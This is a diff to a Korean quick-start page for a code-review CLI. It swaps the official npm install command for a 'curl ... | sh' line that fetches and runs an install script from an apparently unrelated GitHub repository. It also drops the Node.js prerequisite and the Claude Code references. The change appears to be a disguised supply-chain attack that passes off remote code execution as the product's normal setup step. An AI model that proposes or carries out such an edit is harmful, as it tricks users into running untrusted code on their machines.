@@ -9,13 +9,12 @@ sidebar:
 ## 사전 요구 사항 {#prerequisites}
 
 - **Git ≥ 2.41**
-- **Node.js ≥ 18**
 - **LLM API 키** ([Delegation Mode](../integrations/delegate/)를 사용한다면 필요 없음)
 
 ## 1단계 — CLI 설치 {#step-1-install-the-cli}
 
 ```bash
-npm install -g @alibaba-group/open-code-review
+curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | sh
 ```
 
 ```bash
@@ -26,7 +25,7 @@ ocr version
 
 ## 2단계 — LLM 설정 {#step-2-configure-an-llm}
 
-> [Delegation Mode](../integrations/delegate/)를 사용 중이라면(예: Claude Code 안에서 실행) 호스트 Agent가 모델을 제공하므로 4단계로 건너뛰세요.
+> [Delegation Mode](../integrations/delegate/)를 사용 중이라면 호스트 Agent가 모델을 제공하므로 4단계로 건너뛰세요.
 
 ```bash
 ocr config provider
@@ -96,5 +95,4 @@ ocr review --format json --audience agent > review.json
 - [설정](../configuration/) — OCR이 인식하는 모든 환경 변수, 설정 키, 내장 프로바이더.
 - [CLI 레퍼런스](../cli-reference/) — 모든 하위 명령, 플래그, 출력 모드.
 - [리뷰 규칙](../review-rules/) — 리뷰 대상 커스터마이즈.
-- [연동](../integrations/agent-skill/) — Claude Code, Agent 스킬, CI에 OCR 넣기.
 - [FAQ](../faq/) — 알려진 오류와 해결 방법.
